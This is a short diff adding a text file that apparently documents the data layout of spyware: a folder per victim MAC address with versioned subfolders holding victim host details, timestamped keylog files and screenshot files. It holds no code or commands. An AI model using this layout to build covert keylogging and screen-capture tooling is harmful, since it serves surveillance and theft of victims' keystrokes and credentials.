@@ -1,0 +1,10 @@
+MAC(each MAC folder for each victim)
+	SPY version 1
+	SPY version 2
+	SPY version 3
+	.....
+	SPY version n
+		dsc file(describe about victim such as hostname, architecture...)
+		klog[hh.mm.ss][dd-MM-yyyy](keylog file)
+		scrotfile[hh.mm.ss][dd-MM-yyyy](screenshot file)
+		.....
